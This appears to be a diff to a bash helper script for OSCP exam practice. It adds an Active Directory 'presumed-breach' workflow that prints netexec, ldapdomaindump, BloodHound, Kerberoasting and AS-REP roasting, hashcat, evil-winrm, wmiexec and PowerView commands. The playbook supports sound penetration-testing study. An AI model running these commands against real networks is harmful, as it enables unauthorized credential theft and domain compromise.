@@ -8,7 +8,7 @@
 set -euo pipefail
 umask 077
 
-TOOLKIT_VERSION="2026.05.30-tools"
+TOOLKIT_VERSION="2026.05.30-ad-presumed"
 ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
 SCANS_DIR="$ROOT_DIR/scans"
 DISC_DIR="$SCANS_DIR/discovery"
@@ -208,6 +208,12 @@ fix_scan_perms() {
 command_line() {
   printf '$'
   printf ' %q' "$@"
+  printf '\n'
+}
+
+print_cmd() {
+  printf '  '
+  printf '%q ' "$@"
   printf '\n'
 }
 
@@ -511,7 +517,8 @@ Service enumeration:
 
 Workflow helpers:
   ./scripts/oscp.sh quick [IP]                 # nmap-full, nmap-deep, enum-all
-  ./scripts/oscp.sh ad [IP]                    # AD command blocks/checklist
+  ./scripts/oscp.sh ad [DC_IP] [DOMAIN] [USER] [PASS]
+                                               # AD presumed-breach command block
   ./scripts/oscp.sh loot-linux                 # Linux post-shell checklist
   ./scripts/oscp.sh loot-windows               # Windows post-shell checklist
   ./scripts/oscp.sh win-privs [FILE]           # whoami /priv triage and parser
@@ -1111,42 +1118,187 @@ ad_helper() {
   if [[ "$target" != "TARGET" ]]; then
     require_ipv4 "$target" "AD target"
   fi
-  mkdir -p "$AD_DIR"
+  local domain_arg="${2:-${OSCP_DOMAIN:-}}"
+  local domain
+  domain="$(normalize_domain "$domain_arg")"
+  [[ -n "$domain" ]] || domain="DOMAIN"
 
+  local user="${3:-USER}"
+  local secret="${4:-PASS}"
+  local has_creds=0
+  [[ -n "${3:-}" && -n "${4:-}" ]] && has_creds=1
+
+  local subnet="${OSCP_SUBNET:-SUBNET_CIDR}"
+  local rel_ad="ad"
+  if [[ "$target" != "TARGET" ]]; then
+    rel_ad="ad/$target"
+  fi
+  mkdir -p "$ROOT_DIR/$rel_ad"
+
+  echo "============================================================"
+  echo " AD Presumed-Breach Workflow"
+  echo "============================================================"
+  echo "DC / target : $target"
+  echo "Subnet      : $subnet"
+  echo "Domain      : $domain"
+  echo "Username    : $user"
+  echo "Output dir  : $rel_ad"
+  echo
+  cat <<'EOF'
+Method:
+  1. Prove the supplied credential.
+  2. Enumerate shares, users, groups, policy, and host access.
+  3. Build the BloodHound graph.
+  4. Roast/crack only what the data shows is worth cracking.
+  5. Use local-admin or ACL paths to get shells, then repeat the credential loop.
+
+Do not start with blind spraying. Check password policy first and treat every new
+credential as a new enumeration pass.
+
+EOF
+
+  echo "[1] Confirm domain and DC"
+  print_cmd ldapsearch -x -H "ldap://$target" -s base namingContexts defaultNamingContext dnsHostName ldapServiceName
+  if [[ "$domain" != "DOMAIN" ]]; then
+    print_cmd dig "@$target" "_ldap._tcp.dc._msdcs.$domain" SRV
+  else
+    echo "  dig @DC_IP _ldap._tcp.dc._msdcs.DOMAIN SRV"
+  fi
+  echo
+
+  echo "[2] Validate the supplied credential"
+  if [[ "$has_creds" -eq 1 ]]; then
+    print_cmd netexec smb "$target" -d "$domain" -u "$user" -p "$secret"
+    print_cmd netexec smb "$target" -d "$domain" -u "$user" -p "$secret" --pass-pol
+    print_cmd netexec winrm "$target" -d "$domain" -u "$user" -p "$secret"
+  else
+    cat <<EOF
+  netexec smb $target -d $domain -u USER -p 'PASS'
+  netexec smb $target -d $domain -u USER -p 'PASS' --pass-pol
+  netexec winrm $target -d $domain -u USER -p 'PASS'
+EOF
+  fi
+  echo
+
+  echo "[3] Enumerate AD over SMB/LDAP with the credential"
+  if [[ "$has_creds" -eq 1 ]]; then
+    print_cmd netexec smb "$target" -d "$domain" -u "$user" -p "$secret" --shares
+    print_cmd netexec smb "$target" -d "$domain" -u "$user" -p "$secret" --users
+    print_cmd netexec smb "$target" -d "$domain" -u "$user" -p "$secret" --groups
+    print_cmd netexec smb "$target" -d "$domain" -u "$user" -p "$secret" --loggedon-users
+    print_cmd mkdir -p "$rel_ad/ldapdomaindump"
+    print_cmd ldapdomaindump -u "$domain\\$user" -p "$secret" "ldap://$target" -o "$rel_ad/ldapdomaindump"
+  else
+    cat <<EOF
+  netexec smb $target -d $domain -u USER -p 'PASS' --shares
+  netexec smb $target -d $domain -u USER -p 'PASS' --users
+  netexec smb $target -d $domain -u USER -p 'PASS' --groups
+  netexec smb $target -d $domain -u USER -p 'PASS' --loggedon-users
+  mkdir -p $rel_ad/ldapdomaindump
+  ldapdomaindump -u '$domain\USER' -p 'PASS' ldap://$target -o $rel_ad/ldapdomaindump
+EOF
+  fi
+  echo
+
+  echo "[4] Check access across the AD subnet"
+  if [[ "$has_creds" -eq 1 ]]; then
+    print_cmd netexec smb "$subnet" -d "$domain" -u "$user" -p "$secret" --shares
+    print_cmd netexec winrm "$subnet" -d "$domain" -u "$user" -p "$secret"
+  else
+    cat <<EOF
+  netexec smb $subnet -d $domain -u USER -p 'PASS' --shares
+  netexec winrm $subnet -d $domain -u USER -p 'PASS'
+EOF
+  fi
+  cat <<'EOF'
+Interpretation:
+  - SMB "Pwn3d!" or WinRM success means you likely have a shell path.
+  - Interesting shares are not just loot; they often contain usernames, scripts,
+    service passwords, SSH keys, database strings, or deployment config.
+
+EOF
+
+  echo "[5] BloodHound collection"
+  if [[ "$has_creds" -eq 1 ]]; then
+    print_cmd bloodhound-python -u "$user" -p "$secret" -d "$domain" -ns "$target" -c All --zip -op "$rel_ad/bloodhound"
+  else
+    cat <<EOF
+  bloodhound-python -u USER -p 'PASS' -d $domain -ns $target -c All --zip -op $rel_ad/bloodhound
+EOF
+  fi
+  cat <<'EOF'
+BloodHound triage:
+  - Mark the supplied user and any cracked/loot creds as owned.
+  - Check shortest paths to Domain Admins and high-value computers.
+  - Check Kerberoastable Users, AS-REP Roastable Users, Find Principals with DCSync Rights.
+  - Check ACL edges: GenericAll, GenericWrite, WriteDacl, WriteOwner, AllExtendedRights.
+  - Check local admin, session, RDP, and WinRM edges for reachable hosts.
+
+EOF
+
+  echo "[6] Kerberos roasting"
+  if [[ "$has_creds" -eq 1 ]]; then
+    print_cmd impacket-GetUserSPNs "$domain/$user:$secret" -dc-ip "$target" -request -outputfile "$rel_ad/kerberoast.txt"
+    print_cmd impacket-GetNPUsers "$domain/$user:$secret" -dc-ip "$target" -request -outputfile "$rel_ad/asrep.txt"
+  else
+    cat <<EOF
+  impacket-GetUserSPNs $domain/USER:'PASS' -dc-ip $target -request -outputfile $rel_ad/kerberoast.txt
+  impacket-GetNPUsers $domain/USER:'PASS' -dc-ip $target -request -outputfile $rel_ad/asrep.txt
+EOF
+  fi
   cat <<EOF
-[AD ENUMERATION STARTERS]
+  hashcat -m 13100 $rel_ad/kerberoast.txt /usr/share/wordlists/rockyou.txt
+  hashcat -m 18200 $rel_ad/asrep.txt /usr/share/wordlists/rockyou.txt
+EOF
+  echo
 
-Confirm domain:
-  ldapsearch -x -H ldap://$target -s base namingContexts defaultNamingContext dnsHostName
+  echo "[7] Shell and lateral movement checks"
+  if [[ "$has_creds" -eq 1 ]]; then
+    print_cmd evil-winrm -i "$target" -u "$user" -p "$secret"
+    print_cmd impacket-wmiexec "$domain/$user:$secret@$target"
+  else
+    cat <<EOF
+  evil-winrm -i TARGET_IP -u USER -p 'PASS'
+  impacket-wmiexec $domain/USER:'PASS'@TARGET_IP
+EOF
+  fi
+  cat <<'EOF'
+After a shell:
+  whoami /all
+  hostname
+  ipconfig /all
+  net user /domain
+  net group "Domain Admins" /domain
+  dir C:\Users
 
-With creds:
-  netexec smb $target -u USER -p 'PASS'
-  netexec smb $target -u USER -p 'PASS' --shares
-  netexec smb $target -u USER -p 'PASS' --users
-  netexec smb $target -u USER -p 'PASS' --groups
+PowerView after uploading/importing PowerView.ps1:
+  . .\PowerView.ps1
+  Get-Domain
+  Get-DomainComputer -Properties dnshostname,operatingsystem
+  Get-DomainUser -SPN | select samaccountname,serviceprincipalname
+  Get-DomainGroupMember "Domain Admins"
+  Find-LocalAdminAccess -Verbose
 
-Kerberoast:
-  impacket-GetUserSPNs DOMAIN/USER:'PASS' -dc-ip $target -request -outputfile ad/kerberoast.txt
-  hashcat -m 13100 ad/kerberoast.txt /usr/share/wordlists/rockyou.txt
+EOF
 
-AS-REP roast:
-  impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip $target -format hashcat -outputfile ad/asrep.txt
-  hashcat -m 18200 ad/asrep.txt /usr/share/wordlists/rockyou.txt
-
-BloodHound collection after creds:
-  bloodhound-python -u USER -p 'PASS' -d DOMAIN -c All -ns $target
-
-WinRM:
-  evil-winrm -i $target -u USER -p 'PASS'
-  evil-winrm -i $target -u USER -H NTLM_HASH
-
-Pass-the-hash:
-  netexec smb TARGET -u USER -H NTLM_HASH
-  impacket-wmiexec -hashes :NTLM_HASH DOMAIN/USER@TARGET
+  echo "[8] Credential loop and evidence"
+  cat <<EOF
+  ./scripts/oscp.sh add-cred ad USER 'PASS' 'presumed breach / AD loot'
+  ./scripts/oscp.sh hash '<hash> (kerberoast/asrep/source)'
+  ./scripts/oscp.sh note "AD: what changed, evidence path, next host"
+  ./scripts/oscp.sh screenshot "ad evidence with ip visible" $target
+EOF
+  cat <<'EOF'
+Loop:
+  - Every new password/hash gets logged, tested against SMB and WinRM, then used
+    for a fresh BloodHound/NetExec pass where appropriate.
+  - Dump local SAM/LSA or domain secrets only after you have admin rights and the
+    current lab/exam rules permit that exact action.
+  - Keep commands reproducible for the report; do not rely on terminal scrollback.
 
 [REMINDERS]
-- This helper prints commands; it does not choose or execute an attack path.
-- Track AD machine points from the live exam control panel and current official guide.
+  - This helper prints commands; it does not execute an attack path.
+  - Track AD machine points from the live exam control panel and current official guide.
 EOF
 }
 
@@ -1631,6 +1783,7 @@ EOF
   print_cmd_status "Impacket secretsdump" impacket-secretsdump secretsdump.py || true
   print_cmd_status "Impacket GetUserSPNs" impacket-GetUserSPNs GetUserSPNs.py || true
   print_cmd_status "Impacket GetNPUsers" impacket-GetNPUsers GetNPUsers.py || true
+  print_cmd_status "ldapdomaindump" ldapdomaindump || true
   print_cmd_status "Responder" responder || true
   print_cmd_status "Empire" powershell-empire empire-server empire || true
   print_cmd_status "Covenant" covenant Covenant || true
@@ -1820,7 +1973,7 @@ tools_snippets() {
   . .\PowerView.ps1
 
 5. Kali-side AD command reminders after valid creds:
-  ./scripts/oscp.sh ad TARGET_IP
+  ./scripts/oscp.sh ad DC_IP DOMAIN USER 'PASS'
   evil-winrm -i TARGET_IP -u USER -p 'PASS'
   netexec smb TARGET_IP -u USER -p 'PASS' --shares
   impacket-GetUserSPNs DOMAIN/USER:'PASS' -dc-ip DC_IP -request -outputfile ad/kerberoast.txt
